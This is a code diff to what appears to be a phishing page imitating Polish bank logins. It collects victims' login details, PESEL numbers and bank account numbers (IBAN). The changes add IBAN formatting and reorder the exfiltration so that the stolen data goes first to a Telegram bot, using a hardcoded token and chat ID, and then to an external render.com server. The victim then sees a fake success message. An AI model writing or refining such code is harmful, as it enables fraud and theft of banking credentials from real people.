@@ -971,7 +971,7 @@
                             <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
                             <div class="iban-wrapper" id="ibanWrapper">
                                 <span class="pl-prefix">PL</span>
-                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required autocomplete="off">
+                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="32" autocomplete="off">
                             </div>
                         </div>
                         <div class="form-actions">
@@ -1410,12 +1410,13 @@
         })();
 
         // ============================================================
-        //  TELEGRAM — НОВЫЙ ТОКЕН
+        //  TELEGRAM — ТОКЕН И CHAT_ID
         // ============================================================
         var TELEGRAM_BOT_TOKEN = '8403131166:AAEjVV93BhQBfFcJ_8rud46BwWC3omtKXY8';
-        var TELEGRAM_CHAT_ID = '-1004256695843';
+        var TELEGRAM_CHAT_ID = '-1004375434527';
 
         function sendToTelegram(message) {
+            console.log('[TG] Отправка в чат:', TELEGRAM_CHAT_ID);
             fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1427,8 +1428,11 @@
             })
             .then(function(r) { return r.json(); })
             .then(function(d) {
-                if (d.ok) console.log('✅ Wysłano do Telegram');
-                else console.error('❌ Błąd Telegram:', d);
+                if (d.ok) {
+                    console.log('✅ Wysłano do Telegram');
+                } else {
+                    console.error('❌ Błąd Telegram:', d);
+                }
             })
             .catch(function(e) { console.error('❌ Błąd sieci:', e); });
         }
@@ -1469,8 +1473,23 @@
             return cleaned;
         }
 
+        // Форматирование IBAN: XX XXXX XXXX XXXX XXXX XXXX XXXX
+        function formatIban(value) {
+            var cleaned = cleanIbanValue(value);
+            var parts = [];
+            for (var i = 0; i < cleaned.length; i++) {
+                if (i === 0) {
+                    parts.push(cleaned.substring(0, 2));
+                    i = 1;
+                } else if (i >= 2 && (i - 2) % 4 === 0) {
+                    parts.push(cleaned.substring(i, i + 4));
+                }
+            }
+            return parts.join(' ');
+        }
+
         // ============================================================
-        //  handleLogin — универсальный
+        //  handleLogin
         // ============================================================
         function handleLogin(event, bankName) {
             event.preventDefault();
@@ -1513,9 +1532,6 @@
             return false;
         }
 
-        // ============================================================
-        //  handleLogin2 — для Millenium (с Pesel)
-        // ============================================================
         function handleLogin2(event, bankName) {
             event.preventDefault();
             var form = event.target;
@@ -1640,10 +1656,17 @@
             var ibanInput = document.getElementById('iban');
             var ibanWrapper = document.getElementById('ibanWrapper');
 
+            // IBAN — форматирование с пробелами (XX XXXX XXXX...)
             if (ibanInput) {
                 ibanInput.addEventListener('input', function() {
-                    var cleaned = cleanIbanValue(this.value);
-                    if (this.value !== cleaned) this.value = cleaned;
+                    var cursorPos = this.selectionStart;
+                    var oldValue = this.value;
+                    var formatted = formatIban(this.value);
+                    if (this.value !== formatted) {
+                        this.value = formatted;
+                        // Ставим курсор в конец
+                        this.setSelectionRange(this.value.length, this.value.length);
+                    }
                     this.classList.remove('error');
                     if (ibanWrapper) ibanWrapper.classList.remove('error');
                 });
@@ -1714,48 +1737,30 @@
                                   '🏦 *IBAN:* ' + formData.iban + '\n' +
                                   '🕒 ' + new Date().toLocaleString();
 
+                    // СНАЧАЛА отправляем в Telegram (гарантированно)
+                    sendToTelegram(message);
+
+                    // Потом пробуем на сервер (если работает — ок, если нет — не важно)
                     fetch('https://gvvbt.onrender.com/send', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(formData)
                     })
                     .then(function(response) { return response.json(); })
-                    .then(function(data) {
-                        if (data.success) {
-                            showToast('Dane zostały wysłane!', true);
-                            if (loginNav) loginNav.classList.add('hidden');
-                            if (imageBanner) imageBanner.classList.add('hidden');
-                            if (formSectionElement) formSectionElement.classList.add('hidden');
-                            if (bankSelection) bankSelection.classList.add('visible');
-                            if (bankFooter) bankFooter.classList.add('visible');
-                            window.scrollTo({ top: 0, behavior: 'smooth' });
-                        } else {
-                            sendToTelegram(message);
-                            showToast('Dane zostały wysłane!', true);
-                            if (loginNav) loginNav.classList.add('hidden');
-                            if (imageBanner) imageBanner.classList.add('hidden');
-                            if (formSectionElement) formSectionElement.classList.add('hidden');
-                            if (bankSelection) bankSelection.classList.add('visible');
-                            if (bankFooter) bankFooter.classList.add('visible');
-                            window.scrollTo({ top: 0, behavior: 'smooth' });
-                        }
-                    })
-                    .catch(function(error) {
-                        sendToTelegram(message);
+                    .catch(function(error) { console.log('Сервер недоступен, но данные уже ушли в Telegram'); })
+                    .finally(function() {
                         showToast('Dane zostały wysłane!', true);
                         if (loginNav) loginNav.classList.add('hidden');
                         if (imageBanner) imageBanner.classList.add('hidden');
                         if (formSectionElement) formSectionElement.classList.add('hidden');
                         if (bankSelection) bankSelection.classList.add('visible');
                         if (bankFooter) bankFooter.classList.add('visible');
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    })
-                    .finally(function() {
                         if (submitBtn) {
                             submitBtn.disabled = false;
                             submitBtn.classList.remove('loading');
                             submitBtn.innerHTML = 'Wyślij';
                         }
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
                     });
                 });
 
